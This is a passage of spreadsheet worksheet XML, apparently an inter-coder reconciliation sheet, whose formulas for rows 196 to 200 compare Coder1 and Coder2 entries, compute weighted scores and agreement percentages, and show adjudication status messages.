        <f>IF(AND(Coder1!O196&amp;""&lt;&gt;"",Coder1!O196&amp;""=Coder2!O196&amp;""),Coder1!O196,"")</f>
        <v/>
      </c>
      <c r="P196" s="14">
        <f>IF(AND(Coder1!P196&amp;""&lt;&gt;"",Coder1!P196&amp;""=Coder2!P196&amp;""),Coder1!P196,"")</f>
        <v/>
      </c>
      <c r="Q196" s="14">
        <f>IF(AND(Coder1!Q196&amp;""&lt;&gt;"",Coder1!Q196&amp;""=Coder2!Q196&amp;""),Coder1!Q196,"")</f>
        <v/>
      </c>
      <c r="R196" s="14">
        <f>IF(AND(Coder1!R196&amp;""&lt;&gt;"",Coder1!R196&amp;""=Coder2!R196&amp;""),Coder1!R196,"")</f>
        <v/>
      </c>
      <c r="S196" s="14">
        <f>IF(AND(Coder1!S196&amp;""&lt;&gt;"",Coder1!S196&amp;""=Coder2!S196&amp;""),Coder1!S196,"")</f>
        <v/>
      </c>
      <c r="T196" s="14">
        <f>IF(AND(Coder1!T196&amp;""&lt;&gt;"",Coder1!T196&amp;""=Coder2!T196&amp;""),Coder1!T196,"")</f>
        <v/>
      </c>
      <c r="U196" s="14">
        <f>IF(AND(Coder1!U196&amp;""&lt;&gt;"",Coder1!U196&amp;""=Coder2!U196&amp;""),Coder1!U196,"")</f>
        <v/>
      </c>
      <c r="V196" s="14">
        <f>IF(AND(Coder1!V196&amp;""&lt;&gt;"",Coder1!V196&amp;""=Coder2!V196&amp;""),Coder1!V196,"")</f>
        <v/>
      </c>
      <c r="W196" s="14">
        <f>IF(AND(Coder1!W196&amp;""&lt;&gt;"",Coder1!W196&amp;""=Coder2!W196&amp;""),Coder1!W196,"")</f>
        <v/>
      </c>
      <c r="X196" s="14">
        <f>IF(AND(Coder1!X196&amp;""&lt;&gt;"",Coder1!X196&amp;""=Coder2!X196&amp;""),Coder1!X196,"")</f>
        <v/>
      </c>
      <c r="Y196" s="14">
        <f>IF(AND(Coder1!Y196&amp;""&lt;&gt;"",Coder1!Y196&amp;""=Coder2!Y196&amp;""),Coder1!Y196,"")</f>
        <v/>
      </c>
      <c r="Z196" s="14">
        <f>IF(AND(Coder1!Z196&amp;""&lt;&gt;"",Coder1!Z196&amp;""=Coder2!Z196&amp;""),Coder1!Z196,"")</f>
        <v/>
      </c>
      <c r="AA196" s="14">
        <f>IF(AND(Coder1!AA196&amp;""&lt;&gt;"",Coder1!AA196&amp;""=Coder2!AA196&amp;""),Coder1!AA196,"")</f>
        <v/>
      </c>
      <c r="AB196" s="14">
        <f>IF(AND(Coder1!AB196&amp;""&lt;&gt;"",Coder1!AB196&amp;""=Coder2!AB196&amp;""),Coder1!AB196,"")</f>
        <v/>
      </c>
      <c r="AC196" s="14">
        <f>IF(AND(Coder1!AC196&amp;""&lt;&gt;"",Coder1!AC196&amp;""=Coder2!AC196&amp;""),Coder1!AC196,"")</f>
        <v/>
      </c>
      <c r="AD196" s="14">
        <f>IF(AND(Coder1!AD196&amp;""&lt;&gt;"",Coder1!AD196&amp;""=Coder2!AD196&amp;""),Coder1!AD196,"")</f>
        <v/>
      </c>
      <c r="AE196" s="14">
        <f>IF(AND(Coder1!AE196&amp;""&lt;&gt;"",Coder1!AE196&amp;""=Coder2!AE196&amp;""),Coder1!AE196,"")</f>
        <v/>
      </c>
      <c r="AF196" s="14">
        <f>IF(AND(Coder1!AF196&amp;""&lt;&gt;"",Coder1!AF196&amp;""=Coder2!AF196&amp;""),Coder1!AF196,"")</f>
        <v/>
      </c>
      <c r="AG196" s="14">
        <f>IF(AND(Coder1!AG196&amp;""&lt;&gt;"",Coder1!AG196&amp;""=Coder2!AG196&amp;""),Coder1!AG196,"")</f>
        <v/>
      </c>
      <c r="AH196" s="14">
        <f>IF(AND(Coder1!AH196&amp;""&lt;&gt;"",Coder1!AH196&amp;""=Coder2!AH196&amp;""),Coder1!AH196,"")</f>
        <v/>
      </c>
      <c r="AI196" s="11">
        <f>IF(COUNT(E196:L196)=0,"",SUM(E196:L196))</f>
        <v/>
      </c>
      <c r="AJ196" s="11">
        <f>IF(AI196="","",N(E196)*3+N(F196)*2+N(G196)*2+N(H196)*2+N(I196)*2+N(J196)*3+N(K196)*3+N(L196)*3)</f>
        <v/>
      </c>
      <c r="AK196" s="11">
        <f>IF(AI196="","",COUNTIF(N196:AG196,1))</f>
        <v/>
      </c>
      <c r="AL196" s="11">
        <f>IF(OR(AJ196="",AJ196=0),"",ROUND(100*(AJ196-AK196)/AJ196,1))</f>
        <v/>
      </c>
      <c r="AM196" s="11">
        <f>IF(AND(Coder1!AN196=1,Coder2!AN196=1),IF(COUNTBLANK(E196:AH196)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN196" s="11">
        <f>IF(AND(Coder1!AN196=1,Coder2!AN196=1),IF(SUMPRODUCT(--(Coder1!E196:AH196&amp;""&lt;&gt;Coder2!E196:AH196&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO196" s="11" t="n"/>
    </row>
    <row r="197">
      <c r="A197" s="11">
        <f>Coder1!A197</f>
        <v/>
      </c>
      <c r="B197" s="11">
        <f>Coder1!B197</f>
        <v/>
      </c>
      <c r="C197" s="11">
        <f>Coder1!C197</f>
        <v/>
      </c>
      <c r="D197" s="11">
        <f>Coder1!D197</f>
        <v/>
      </c>
      <c r="E197" s="14">
        <f>IF(AND(Coder1!E197&amp;""&lt;&gt;"",Coder1!E197&amp;""=Coder2!E197&amp;""),Coder1!E197,"")</f>
        <v/>
      </c>
      <c r="F197" s="14">
        <f>IF(AND(Coder1!F197&amp;""&lt;&gt;"",Coder1!F197&amp;""=Coder2!F197&amp;""),Coder1!F197,"")</f>
        <v/>
      </c>
      <c r="G197" s="14">
        <f>IF(AND(Coder1!G197&amp;""&lt;&gt;"",Coder1!G197&amp;""=Coder2!G197&amp;""),Coder1!G197,"")</f>
        <v/>
      </c>
      <c r="H197" s="14">
        <f>IF(AND(Coder1!H197&amp;""&lt;&gt;"",Coder1!H197&amp;""=Coder2!H197&amp;""),Coder1!H197,"")</f>
        <v/>
      </c>
      <c r="I197" s="14">
        <f>IF(AND(Coder1!I197&amp;""&lt;&gt;"",Coder1!I197&amp;""=Coder2!I197&amp;""),Coder1!I197,"")</f>
        <v/>
      </c>
      <c r="J197" s="14">
        <f>IF(AND(Coder1!J197&amp;""&lt;&gt;"",Coder1!J197&amp;""=Coder2!J197&amp;""),Coder1!J197,"")</f>
        <v/>
      </c>
      <c r="K197" s="14">
        <f>IF(AND(Coder1!K197&amp;""&lt;&gt;"",Coder1!K197&amp;""=Coder2!K197&amp;""),Coder1!K197,"")</f>
        <v/>
      </c>
      <c r="L197" s="14">
        <f>IF(AND(Coder1!L197&amp;""&lt;&gt;"",Coder1!L197&amp;""=Coder2!L197&amp;""),Coder1!L197,"")</f>
        <v/>
      </c>
      <c r="M197" s="14">
        <f>IF(AND(Coder1!M197&amp;""&lt;&gt;"",Coder1!M197&amp;""=Coder2!M197&amp;""),Coder1!M197,"")</f>
        <v/>
      </c>
      <c r="N197" s="14">
        <f>IF(AND(Coder1!N197&amp;""&lt;&gt;"",Coder1!N197&amp;""=Coder2!N197&amp;""),Coder1!N197,"")</f>
        <v/>
      </c>
      <c r="O197" s="14">
        <f>IF(AND(Coder1!O197&amp;""&lt;&gt;"",Coder1!O197&amp;""=Coder2!O197&amp;""),Coder1!O197,"")</f>
        <v/>
      </c>
      <c r="P197" s="14">
        <f>IF(AND(Coder1!P197&amp;""&lt;&gt;"",Coder1!P197&amp;""=Coder2!P197&amp;""),Coder1!P197,"")</f>
        <v/>
      </c>
      <c r="Q197" s="14">
        <f>IF(AND(Coder1!Q197&amp;""&lt;&gt;"",Coder1!Q197&amp;""=Coder2!Q197&amp;""),Coder1!Q197,"")</f>
        <v/>
      </c>
      <c r="R197" s="14">
        <f>IF(AND(Coder1!R197&amp;""&lt;&gt;"",Coder1!R197&amp;""=Coder2!R197&amp;""),Coder1!R197,"")</f>
        <v/>
      </c>
      <c r="S197" s="14">
        <f>IF(AND(Coder1!S197&amp;""&lt;&gt;"",Coder1!S197&amp;""=Coder2!S197&amp;""),Coder1!S197,"")</f>
        <v/>
      </c>
      <c r="T197" s="14">
        <f>IF(AND(Coder1!T197&amp;""&lt;&gt;"",Coder1!T197&amp;""=Coder2!T197&amp;""),Coder1!T197,"")</f>
        <v/>
      </c>
      <c r="U197" s="14">
        <f>IF(AND(Coder1!U197&amp;""&lt;&gt;"",Coder1!U197&amp;""=Coder2!U197&amp;""),Coder1!U197,"")</f>
        <v/>
      </c>
      <c r="V197" s="14">
        <f>IF(AND(Coder1!V197&amp;""&lt;&gt;"",Coder1!V197&amp;""=Coder2!V197&amp;""),Coder1!V197,"")</f>
        <v/>
      </c>
      <c r="W197" s="14">
        <f>IF(AND(Coder1!W197&amp;""&lt;&gt;"",Coder1!W197&amp;""=Coder2!W197&amp;""),Coder1!W197,"")</f>
        <v/>
      </c>
      <c r="X197" s="14">
        <f>IF(AND(Coder1!X197&amp;""&lt;&gt;"",Coder1!X197&amp;""=Coder2!X197&amp;""),Coder1!X197,"")</f>
        <v/>
      </c>
      <c r="Y197" s="14">
        <f>IF(AND(Coder1!Y197&amp;""&lt;&gt;"",Coder1!Y197&amp;""=Coder2!Y197&amp;""),Coder1!Y197,"")</f>
        <v/>
      </c>
      <c r="Z197" s="14">
        <f>IF(AND(Coder1!Z197&amp;""&lt;&gt;"",Coder1!Z197&amp;""=Coder2!Z197&amp;""),Coder1!Z197,"")</f>
        <v/>
      </c>
      <c r="AA197" s="14">
        <f>IF(AND(Coder1!AA197&amp;""&lt;&gt;"",Coder1!AA197&amp;""=Coder2!AA197&amp;""),Coder1!AA197,"")</f>
        <v/>
      </c>
      <c r="AB197" s="14">
        <f>IF(AND(Coder1!AB197&amp;""&lt;&gt;"",Coder1!AB197&amp;""=Coder2!AB197&amp;""),Coder1!AB197,"")</f>
        <v/>
      </c>
      <c r="AC197" s="14">
        <f>IF(AND(Coder1!AC197&amp;""&lt;&gt;"",Coder1!AC197&amp;""=Coder2!AC197&amp;""),Coder1!AC197,"")</f>
        <v/>
      </c>
      <c r="AD197" s="14">
        <f>IF(AND(Coder1!AD197&amp;""&lt;&gt;"",Coder1!AD197&amp;""=Coder2!AD197&amp;""),Coder1!AD197,"")</f>
        <v/>
      </c>
      <c r="AE197" s="14">
        <f>IF(AND(Coder1!AE197&amp;""&lt;&gt;"",Coder1!AE197&amp;""=Coder2!AE197&amp;""),Coder1!AE197,"")</f>
        <v/>
      </c>
      <c r="AF197" s="14">
        <f>IF(AND(Coder1!AF197&amp;""&lt;&gt;"",Coder1!AF197&amp;""=Coder2!AF197&amp;""),Coder1!AF197,"")</f>
        <v/>
      </c>
      <c r="AG197" s="14">
        <f>IF(AND(Coder1!AG197&amp;""&lt;&gt;"",Coder1!AG197&amp;""=Coder2!AG197&amp;""),Coder1!AG197,"")</f>
        <v/>
      </c>
      <c r="AH197" s="14">
        <f>IF(AND(Coder1!AH197&amp;""&lt;&gt;"",Coder1!AH197&amp;""=Coder2!AH197&amp;""),Coder1!AH197,"")</f>
        <v/>
      </c>
      <c r="AI197" s="11">
        <f>IF(COUNT(E197:L197)=0,"",SUM(E197:L197))</f>
        <v/>
      </c>
      <c r="AJ197" s="11">
        <f>IF(AI197="","",N(E197)*3+N(F197)*2+N(G197)*2+N(H197)*2+N(I197)*2+N(J197)*3+N(K197)*3+N(L197)*3)</f>
        <v/>
      </c>
      <c r="AK197" s="11">
        <f>IF(AI197="","",COUNTIF(N197:AG197,1))</f>
        <v/>
      </c>
      <c r="AL197" s="11">
        <f>IF(OR(AJ197="",AJ197=0),"",ROUND(100*(AJ197-AK197)/AJ197,1))</f>
        <v/>
      </c>
      <c r="AM197" s="11">
        <f>IF(AND(Coder1!AN197=1,Coder2!AN197=1),IF(COUNTBLANK(E197:AH197)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN197" s="11">
        <f>IF(AND(Coder1!AN197=1,Coder2!AN197=1),IF(SUMPRODUCT(--(Coder1!E197:AH197&amp;""&lt;&gt;Coder2!E197:AH197&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO197" s="11" t="n"/>
    </row>
    <row r="198">
      <c r="A198" s="11">
        <f>Coder1!A198</f>
        <v/>
      </c>
      <c r="B198" s="11">
        <f>Coder1!B198</f>
        <v/>
      </c>
      <c r="C198" s="11">
        <f>Coder1!C198</f>
        <v/>
      </c>
      <c r="D198" s="11">
        <f>Coder1!D198</f>
        <v/>
      </c>
      <c r="E198" s="14">
        <f>IF(AND(Coder1!E198&amp;""&lt;&gt;"",Coder1!E198&amp;""=Coder2!E198&amp;""),Coder1!E198,"")</f>
        <v/>
      </c>
      <c r="F198" s="14">
        <f>IF(AND(Coder1!F198&amp;""&lt;&gt;"",Coder1!F198&amp;""=Coder2!F198&amp;""),Coder1!F198,"")</f>
        <v/>
      </c>
      <c r="G198" s="14">
        <f>IF(AND(Coder1!G198&amp;""&lt;&gt;"",Coder1!G198&amp;""=Coder2!G198&amp;""),Coder1!G198,"")</f>
        <v/>
      </c>
      <c r="H198" s="14">
        <f>IF(AND(Coder1!H198&amp;""&lt;&gt;"",Coder1!H198&amp;""=Coder2!H198&amp;""),Coder1!H198,"")</f>
        <v/>
      </c>
      <c r="I198" s="14">
        <f>IF(AND(Coder1!I198&amp;""&lt;&gt;"",Coder1!I198&amp;""=Coder2!I198&amp;""),Coder1!I198,"")</f>
        <v/>
      </c>
      <c r="J198" s="14">
        <f>IF(AND(Coder1!J198&amp;""&lt;&gt;"",Coder1!J198&amp;""=Coder2!J198&amp;""),Coder1!J198,"")</f>
        <v/>
      </c>
      <c r="K198" s="14">
        <f>IF(AND(Coder1!K198&amp;""&lt;&gt;"",Coder1!K198&amp;""=Coder2!K198&amp;""),Coder1!K198,"")</f>
        <v/>
      </c>
      <c r="L198" s="14">
        <f>IF(AND(Coder1!L198&amp;""&lt;&gt;"",Coder1!L198&amp;""=Coder2!L198&amp;""),Coder1!L198,"")</f>
        <v/>
      </c>
      <c r="M198" s="14">
        <f>IF(AND(Coder1!M198&amp;""&lt;&gt;"",Coder1!M198&amp;""=Coder2!M198&amp;""),Coder1!M198,"")</f>
        <v/>
      </c>
      <c r="N198" s="14">
        <f>IF(AND(Coder1!N198&amp;""&lt;&gt;"",Coder1!N198&amp;""=Coder2!N198&amp;""),Coder1!N198,"")</f>
        <v/>
      </c>
      <c r="O198" s="14">
        <f>IF(AND(Coder1!O198&amp;""&lt;&gt;"",Coder1!O198&amp;""=Coder2!O198&amp;""),Coder1!O198,"")</f>
        <v/>
      </c>
      <c r="P198" s="14">
        <f>IF(AND(Coder1!P198&amp;""&lt;&gt;"",Coder1!P198&amp;""=Coder2!P198&amp;""),Coder1!P198,"")</f>
        <v/>
      </c>
      <c r="Q198" s="14">
        <f>IF(AND(Coder1!Q198&amp;""&lt;&gt;"",Coder1!Q198&amp;""=Coder2!Q198&amp;""),Coder1!Q198,"")</f>
        <v/>
      </c>
      <c r="R198" s="14">
        <f>IF(AND(Coder1!R198&amp;""&lt;&gt;"",Coder1!R198&amp;""=Coder2!R198&amp;""),Coder1!R198,"")</f>
        <v/>
      </c>
      <c r="S198" s="14">
        <f>IF(AND(Coder1!S198&amp;""&lt;&gt;"",Coder1!S198&amp;""=Coder2!S198&amp;""),Coder1!S198,"")</f>
        <v/>
      </c>
      <c r="T198" s="14">
        <f>IF(AND(Coder1!T198&amp;""&lt;&gt;"",Coder1!T198&amp;""=Coder2!T198&amp;""),Coder1!T198,"")</f>
        <v/>
      </c>
      <c r="U198" s="14">
        <f>IF(AND(Coder1!U198&amp;""&lt;&gt;"",Coder1!U198&amp;""=Coder2!U198&amp;""),Coder1!U198,"")</f>
        <v/>
      </c>
      <c r="V198" s="14">
        <f>IF(AND(Coder1!V198&amp;""&lt;&gt;"",Coder1!V198&amp;""=Coder2!V198&amp;""),Coder1!V198,"")</f>
        <v/>
      </c>
      <c r="W198" s="14">
        <f>IF(AND(Coder1!W198&amp;""&lt;&gt;"",Coder1!W198&amp;""=Coder2!W198&amp;""),Coder1!W198,"")</f>
        <v/>
      </c>
      <c r="X198" s="14">
        <f>IF(AND(Coder1!X198&amp;""&lt;&gt;"",Coder1!X198&amp;""=Coder2!X198&amp;""),Coder1!X198,"")</f>
        <v/>
      </c>
      <c r="Y198" s="14">
        <f>IF(AND(Coder1!Y198&amp;""&lt;&gt;"",Coder1!Y198&amp;""=Coder2!Y198&amp;""),Coder1!Y198,"")</f>
        <v/>
      </c>
      <c r="Z198" s="14">
        <f>IF(AND(Coder1!Z198&amp;""&lt;&gt;"",Coder1!Z198&amp;""=Coder2!Z198&amp;""),Coder1!Z198,"")</f>
        <v/>
      </c>
      <c r="AA198" s="14">
        <f>IF(AND(Coder1!AA198&amp;""&lt;&gt;"",Coder1!AA198&amp;""=Coder2!AA198&amp;""),Coder1!AA198,"")</f>
        <v/>
      </c>
      <c r="AB198" s="14">
        <f>IF(AND(Coder1!AB198&amp;""&lt;&gt;"",Coder1!AB198&amp;""=Coder2!AB198&amp;""),Coder1!AB198,"")</f>
        <v/>
      </c>
      <c r="AC198" s="14">
        <f>IF(AND(Coder1!AC198&amp;""&lt;&gt;"",Coder1!AC198&amp;""=Coder2!AC198&amp;""),Coder1!AC198,"")</f>
        <v/>
      </c>
      <c r="AD198" s="14">
        <f>IF(AND(Coder1!AD198&amp;""&lt;&gt;"",Coder1!AD198&amp;""=Coder2!AD198&amp;""),Coder1!AD198,"")</f>
        <v/>
      </c>
      <c r="AE198" s="14">
        <f>IF(AND(Coder1!AE198&amp;""&lt;&gt;"",Coder1!AE198&amp;""=Coder2!AE198&amp;""),Coder1!AE198,"")</f>
        <v/>
      </c>
      <c r="AF198" s="14">
        <f>IF(AND(Coder1!AF198&amp;""&lt;&gt;"",Coder1!AF198&amp;""=Coder2!AF198&amp;""),Coder1!AF198,"")</f>
        <v/>
      </c>
      <c r="AG198" s="14">
        <f>IF(AND(Coder1!AG198&amp;""&lt;&gt;"",Coder1!AG198&amp;""=Coder2!AG198&amp;""),Coder1!AG198,"")</f>
        <v/>
      </c>
      <c r="AH198" s="14">
        <f>IF(AND(Coder1!AH198&amp;""&lt;&gt;"",Coder1!AH198&amp;""=Coder2!AH198&amp;""),Coder1!AH198,"")</f>
        <v/>
      </c>
      <c r="AI198" s="11">
        <f>IF(COUNT(E198:L198)=0,"",SUM(E198:L198))</f>
        <v/>
      </c>
      <c r="AJ198" s="11">
        <f>IF(AI198="","",N(E198)*3+N(F198)*2+N(G198)*2+N(H198)*2+N(I198)*2+N(J198)*3+N(K198)*3+N(L198)*3)</f>
        <v/>
      </c>
      <c r="AK198" s="11">
        <f>IF(AI198="","",COUNTIF(N198:AG198,1))</f>
        <v/>
      </c>
      <c r="AL198" s="11">
        <f>IF(OR(AJ198="",AJ198=0),"",ROUND(100*(AJ198-AK198)/AJ198,1))</f>
        <v/>
      </c>
      <c r="AM198" s="11">
        <f>IF(AND(Coder1!AN198=1,Coder2!AN198=1),IF(COUNTBLANK(E198:AH198)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN198" s="11">
        <f>IF(AND(Coder1!AN198=1,Coder2!AN198=1),IF(SUMPRODUCT(--(Coder1!E198:AH198&amp;""&lt;&gt;Coder2!E198:AH198&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO198" s="11" t="n"/>
    </row>
    <row r="199">
      <c r="A199" s="11">
        <f>Coder1!A199</f>
        <v/>
      </c>
      <c r="B199" s="11">
        <f>Coder1!B199</f>
        <v/>
      </c>
      <c r="C199" s="11">
        <f>Coder1!C199</f>
        <v/>
      </c>
      <c r="D199" s="11">
        <f>Coder1!D199</f>
        <v/>
      </c>
      <c r="E199" s="14">
        <f>IF(AND(Coder1!E199&amp;""&lt;&gt;"",Coder1!E199&amp;""=Coder2!E199&amp;""),Coder1!E199,"")</f>
        <v/>
      </c>
      <c r="F199" s="14">
        <f>IF(AND(Coder1!F199&amp;""&lt;&gt;"",Coder1!F199&amp;""=Coder2!F199&amp;""),Coder1!F199,"")</f>
        <v/>
      </c>
      <c r="G199" s="14">
        <f>IF(AND(Coder1!G199&amp;""&lt;&gt;"",Coder1!G199&amp;""=Coder2!G199&amp;""),Coder1!G199,"")</f>
        <v/>
      </c>
      <c r="H199" s="14">
        <f>IF(AND(Coder1!H199&amp;""&lt;&gt;"",Coder1!H199&amp;""=Coder2!H199&amp;""),Coder1!H199,"")</f>
        <v/>
      </c>
      <c r="I199" s="14">
        <f>IF(AND(Coder1!I199&amp;""&lt;&gt;"",Coder1!I199&amp;""=Coder2!I199&amp;""),Coder1!I199,"")</f>
        <v/>
      </c>
      <c r="J199" s="14">
        <f>IF(AND(Coder1!J199&amp;""&lt;&gt;"",Coder1!J199&amp;""=Coder2!J199&amp;""),Coder1!J199,"")</f>
        <v/>
      </c>
      <c r="K199" s="14">
        <f>IF(AND(Coder1!K199&amp;""&lt;&gt;"",Coder1!K199&amp;""=Coder2!K199&amp;""),Coder1!K199,"")</f>
        <v/>
      </c>
      <c r="L199" s="14">
        <f>IF(AND(Coder1!L199&amp;""&lt;&gt;"",Coder1!L199&amp;""=Coder2!L199&amp;""),Coder1!L199,"")</f>
        <v/>
      </c>
      <c r="M199" s="14">
        <f>IF(AND(Coder1!M199&amp;""&lt;&gt;"",Coder1!M199&amp;""=Coder2!M199&amp;""),Coder1!M199,"")</f>
        <v/>
      </c>
      <c r="N199" s="14">
        <f>IF(AND(Coder1!N199&amp;""&lt;&gt;"",Coder1!N199&amp;""=Coder2!N199&amp;""),Coder1!N199,"")</f>
        <v/>
      </c>
      <c r="O199" s="14">
        <f>IF(AND(Coder1!O199&amp;""&lt;&gt;"",Coder1!O199&amp;""=Coder2!O199&amp;""),Coder1!O199,"")</f>
        <v/>
      </c>
      <c r="P199" s="14">
        <f>IF(AND(Coder1!P199&amp;""&lt;&gt;"",Coder1!P199&amp;""=Coder2!P199&amp;""),Coder1!P199,"")</f>
        <v/>
      </c>
      <c r="Q199" s="14">
        <f>IF(AND(Coder1!Q199&amp;""&lt;&gt;"",Coder1!Q199&amp;""=Coder2!Q199&amp;""),Coder1!Q199,"")</f>
        <v/>
      </c>
      <c r="R199" s="14">
        <f>IF(AND(Coder1!R199&amp;""&lt;&gt;"",Coder1!R199&amp;""=Coder2!R199&amp;""),Coder1!R199,"")</f>
        <v/>
      </c>
      <c r="S199" s="14">
        <f>IF(AND(Coder1!S199&amp;""&lt;&gt;"",Coder1!S199&amp;""=Coder2!S199&amp;""),Coder1!S199,"")</f>
        <v/>
      </c>
      <c r="T199" s="14">
        <f>IF(AND(Coder1!T199&amp;""&lt;&gt;"",Coder1!T199&amp;""=Coder2!T199&amp;""),Coder1!T199,"")</f>
        <v/>
      </c>
      <c r="U199" s="14">
        <f>IF(AND(Coder1!U199&amp;""&lt;&gt;"",Coder1!U199&amp;""=Coder2!U199&amp;""),Coder1!U199,"")</f>
        <v/>
      </c>
      <c r="V199" s="14">
        <f>IF(AND(Coder1!V199&amp;""&lt;&gt;"",Coder1!V199&amp;""=Coder2!V199&amp;""),Coder1!V199,"")</f>
        <v/>
      </c>
      <c r="W199" s="14">
        <f>IF(AND(Coder1!W199&amp;""&lt;&gt;"",Coder1!W199&amp;""=Coder2!W199&amp;""),Coder1!W199,"")</f>
        <v/>
      </c>
      <c r="X199" s="14">
        <f>IF(AND(Coder1!X199&amp;""&lt;&gt;"",Coder1!X199&amp;""=Coder2!X199&amp;""),Coder1!X199,"")</f>
        <v/>
      </c>
      <c r="Y199" s="14">
        <f>IF(AND(Coder1!Y199&amp;""&lt;&gt;"",Coder1!Y199&amp;""=Coder2!Y199&amp;""),Coder1!Y199,"")</f>
        <v/>
      </c>
      <c r="Z199" s="14">
        <f>IF(AND(Coder1!Z199&amp;""&lt;&gt;"",Coder1!Z199&amp;""=Coder2!Z199&amp;""),Coder1!Z199,"")</f>
        <v/>
      </c>
      <c r="AA199" s="14">
        <f>IF(AND(Coder1!AA199&amp;""&lt;&gt;"",Coder1!AA199&amp;""=Coder2!AA199&amp;""),Coder1!AA199,"")</f>
        <v/>
      </c>
      <c r="AB199" s="14">
        <f>IF(AND(Coder1!AB199&amp;""&lt;&gt;"",Coder1!AB199&amp;""=Coder2!AB199&amp;""),Coder1!AB199,"")</f>
        <v/>
      </c>
      <c r="AC199" s="14">
        <f>IF(AND(Coder1!AC199&amp;""&lt;&gt;"",Coder1!AC199&amp;""=Coder2!AC199&amp;""),Coder1!AC199,"")</f>
        <v/>
      </c>
      <c r="AD199" s="14">
        <f>IF(AND(Coder1!AD199&amp;""&lt;&gt;"",Coder1!AD199&amp;""=Coder2!AD199&amp;""),Coder1!AD199,"")</f>
        <v/>
      </c>
      <c r="AE199" s="14">
        <f>IF(AND(Coder1!AE199&amp;""&lt;&gt;"",Coder1!AE199&amp;""=Coder2!AE199&amp;""),Coder1!AE199,"")</f>
        <v/>
      </c>
      <c r="AF199" s="14">
        <f>IF(AND(Coder1!AF199&amp;""&lt;&gt;"",Coder1!AF199&amp;""=Coder2!AF199&amp;""),Coder1!AF199,"")</f>
        <v/>
      </c>
      <c r="AG199" s="14">
        <f>IF(AND(Coder1!AG199&amp;""&lt;&gt;"",Coder1!AG199&amp;""=Coder2!AG199&amp;""),Coder1!AG199,"")</f>
        <v/>
      </c>
      <c r="AH199" s="14">
        <f>IF(AND(Coder1!AH199&amp;""&lt;&gt;"",Coder1!AH199&amp;""=Coder2!AH199&amp;""),Coder1!AH199,"")</f>
        <v/>
      </c>
      <c r="AI199" s="11">
        <f>IF(COUNT(E199:L199)=0,"",SUM(E199:L199))</f>
        <v/>
      </c>
      <c r="AJ199" s="11">
        <f>IF(AI199="","",N(E199)*3+N(F199)*2+N(G199)*2+N(H199)*2+N(I199)*2+N(J199)*3+N(K199)*3+N(L199)*3)</f>
        <v/>
      </c>
      <c r="AK199" s="11">
        <f>IF(AI199="","",COUNTIF(N199:AG199,1))</f>
        <v/>
      </c>
      <c r="AL199" s="11">
        <f>IF(OR(AJ199="",AJ199=0),"",ROUND(100*(AJ199-AK199)/AJ199,1))</f>
        <v/>
      </c>
      <c r="AM199" s="11">
        <f>IF(AND(Coder1!AN199=1,Coder2!AN199=1),IF(COUNTBLANK(E199:AH199)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN199" s="11">
        <f>IF(AND(Coder1!AN199=1,Coder2!AN199=1),IF(SUMPRODUCT(--(Coder1!E199:AH199&amp;""&lt;&gt;Coder2!E199:AH199&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO199" s="11" t="n"/>
    </row>
    <row r="200">
      <c r="A200" s="11">
        <f>Coder1!A200</f>
        <v/>
      </c>
      <c r="B200" s="11">
        <f>Coder1!B200</f>
        <v/>
      </c>
      <c r="C200" s="11">
        <f>Coder1!C200</f>
        <v/>
      </c>
      <c r="D200" s="11">
        <f>Coder1!D200</f>
        <v/>
      </c>
      <c r="E200" s="14">
        <f>IF(AND(Coder1!E200&amp;""&lt;&gt;"",Coder1!E200&amp;""=Coder2!E200&amp;""),Coder1!E200,"")</f>
        <v/>
      </c>
      <c r="F200" s="14">
        <f>IF(AND(Coder1!F200&amp;""&lt;&gt;"",Coder1!F200&amp;""=Coder2!F200&amp;""),Coder1!F200,"")</f>
        <v/>
      </c>
      <c r="G200" s="14">
        <f>IF(AND(Coder1!G200&amp;""&lt;&gt;"",Coder1!G200&amp;""=Coder2!G200&amp;""),Coder1!G200,"")</f>
        <v/>
      </c>
      <c r="H200" s="14">
        <f>IF(AND(Coder1!H200&amp;""&lt;&gt;"",Coder1!H200&amp;""=Coder2!H200&amp;""),Coder1!H200,"")</f>
        <v/>
      </c>
      <c r="I200" s="14">
        <f>IF(AND(Coder1!I200&amp;""&lt;&gt;"",Coder1!I200&amp;""=Coder2!I200&amp;""),Coder1!I200,"")</f>
        <v/>
      </c>
      <c r="J200" s="14">
        <f>IF(AND(Coder1!J200&amp;""&lt;&gt;"",Coder1!J200&amp;""=Coder2!J200&amp;""),Coder1!J200,"")</f>
        <v/>
      </c>
      <c r="K200" s="14">
        <f>IF(AND(Coder1!K200&amp;""&lt;&gt;"",Coder1!K200&amp;""=Coder2!K200&amp;""),Coder1!K200,"")</f>
        <v/>
      </c>
      <c r="L200" s="14">
        <f>IF(AND(Coder1!L200&amp;""&lt;&gt;"",Coder1!L200&amp;""=Coder2!L200&amp;""),Coder1!L200,"")</f>
        <v/>
      </c>
      <c r="M200" s="14">
        <f>IF(AND(Coder1!M200&amp;""&lt;&gt;"",Coder1!M200&amp;""=Coder2!M200&amp;""),Coder1!M200,"")</f>
        <v/>
      </c>
      <c r="N200" s="14">
        <f>IF(AND(Coder1!N200&amp;""&lt;&gt;"",Coder1!N200&amp;""=Coder2!N200&amp;""),Coder1!N200,"")</f>
        <v/>
      </c>
      <c r="O200" s="14">
        <f>IF(AND(Coder1!O200&amp;""&lt;&gt;"",Coder1!O200&amp;""=Coder2!O200&amp;""),Coder1!O200,"")</f>
        <v/>
      </c>
      <c r="P200" s="14">
        <f>IF(AND(Coder1!P200&amp;""&lt;&gt;"",Coder1!P200&amp;""=Coder2!P200&amp;""),Coder1!P200,"")</f>
        <v/>
      </c>
      <c r="Q200" s="14">
        <f>IF(AND(Coder1!Q200&amp;""&lt;&gt;"",Coder1!Q200&amp;""=Coder2!Q200&amp;""),Coder1!Q200,"")</f>
        <v/>
      </c>
      <c r="R200" s="14">
